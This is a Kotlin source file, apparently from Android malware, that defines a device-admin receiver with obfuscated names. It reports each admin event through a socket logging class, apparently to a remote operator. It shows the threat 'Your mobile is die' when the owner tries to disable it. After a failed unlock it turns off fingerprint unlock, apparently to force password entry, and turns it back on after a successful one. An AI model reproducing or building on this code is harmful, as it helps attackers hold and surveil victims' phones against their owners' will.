package com.xxx.zzz.adminp

import android.app.Activity
import android.app.admin.DeviceAdminReceiver
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import com.xxx.zzz.socketsp.IOSocketyt

class AdminReceiverzxc : DeviceAdminReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        IOSocketyt.sendLogs("", "AdminReceiver onReceive $intent", "success")
    }

    override fun onEnabled(context: Context, intent: Intent) {
        IOSocketyt.sendLogs("", "AdminReceiver onEnabled $intent", "success")
    }

    override fun onDisableRequested(context: Context, intent: Intent): CharSequence {
        IOSocketyt.sendLogs("", "AdminReceiver onDisableRequested $intent", "success")
        return "Your mobile is die"
    }

    override fun onDisabled(context: Context, intent: Intent) {
        IOSocketyt.sendLogs("", "AdminReceiver onDisabled $intent", "success")
    }

    @Deprecated("Deprecated in Java")
    override fun onPasswordFailed(context: Context, intent: Intent) {
        runCatching {
            val name = ComponentName(context, AdminReceiverzxc::class.java)
            val dpm = context.applicationContext.getSystemService(Activity.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val attempts = dpm.currentFailedPasswordAttempts
            dpm.setKeyguardDisabledFeatures(name, DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT)
            IOSocketyt.sendLogs(
                "",
                "AdminReceiver onPasswordFailed setKeyguardDisabledFeatures KEYGUARD_DISABLE_FINGERPRINT $intent",
                "success"
            )
        }.onFailure {
            IOSocketyt.sendLogs("", "onPasswordFailed ${it.localizedMessage}", "error")
        }
    }

    @Deprecated("Deprecated in Java")
    override fun onPasswordSucceeded(context: Context, intent: Intent) {
        runCatching {
            val name = ComponentName(context, AdminReceiverzxc::class.java)
            val dpm = context.applicationContext.getSystemService(Activity.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            dpm.setKeyguardDisabledFeatures(name, DevicePolicyManager.KEYGUARD_DISABLE_FEATURES_NONE)
            IOSocketyt.sendLogs(
                "",
                "AdminReceiver onPasswordFailed setKeyguardDisabledFeatures KEYGUARD_DISABLE_FEATURES_NONE $intent",
                "success"
            )
        }.onFailure {
            IOSocketyt.sendLogs("", "onPasswordSucceeded ${it.localizedMessage}", "error")
        }
    }
}